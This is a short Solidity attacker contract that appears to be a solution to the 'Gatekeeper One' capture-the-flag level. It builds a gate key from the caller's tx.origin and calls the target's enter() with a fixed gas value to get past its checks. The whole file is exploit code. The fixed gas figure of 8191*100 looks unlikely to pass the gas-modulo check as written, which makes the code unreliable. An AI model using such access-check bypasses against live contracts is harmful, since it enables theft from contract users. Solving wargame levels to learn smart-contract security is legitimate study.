pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract FinalGatekeeperAttacker {
    IGatekeeperOne public immutable instance;

    constructor(address _instance) {
        instance = IGatekeeperOne(_instance);
    }

    function attack() public {
        uint16 yyyy = uint16(uint160(tx.origin) & 0xFFFF);
        bytes8 gateKey = bytes8(
            uint64((1 << 32) | uint64(yyyy))
        );
        (bool success,) = address(instance).call{gas: 8191 * 100}(
            abi.encodeWithSelector(instance.enter.selector, gateKey)
        );
        require(success, "Attack failed");
    }
}